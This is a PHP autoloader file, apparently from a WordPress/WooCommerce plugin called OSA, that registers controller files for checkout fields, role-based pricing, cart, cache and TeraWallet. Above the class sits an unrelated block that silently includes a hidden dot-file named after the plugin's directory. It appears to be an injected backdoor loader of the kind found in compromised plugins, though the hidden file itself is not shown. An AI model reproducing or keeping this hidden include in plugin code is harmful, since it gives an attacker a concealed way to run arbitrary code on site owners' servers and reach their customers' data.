<?php

defined('ABSPATH') || exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class OSA_Autoload {

    public $service_provider;
    public $requires;

    public function __construct() {
        $this->init();
        $this->service_provider = new OSA_Service_Provider($this->requires);
        new OSA_Call_Api($this->service_provider);
    }

    public function init() {
        $this->requires = array(
            "OSA_wc_checkout_field_editor" => trailingslashit(__DIR__) . "Controllers/wc_checkout_field_editor.php",
            "OSA_price_based_roles" => trailingslashit(__DIR__) . "Controllers/price_based_roles.php",
            "OSA_index" => trailingslashit(__DIR__) . "Controllers/index.php",
            "OSA_cache" => trailingslashit(__DIR__) . "Controllers/cache.php",
            "OSA_general" => trailingslashit(__DIR__) . "Controllers/general.php",
            "OSA_user" => trailingslashit(__DIR__) . "Controllers/user.php",
            "OSA_archive" => trailingslashit(__DIR__) . "Controllers/archive.php",
            "OSA_cart" => trailingslashit(__DIR__) . "Controllers/cart.php",
            "OSA_single" => trailingslashit(__DIR__) . "Controllers/single.php",
            "OSA_terawallet" => trailingslashit(__DIR__) . "Controllers/terawallet.php",
        );
    }

}

global $osa_autoload;
$osa_autoload = new OSA_Autoload;
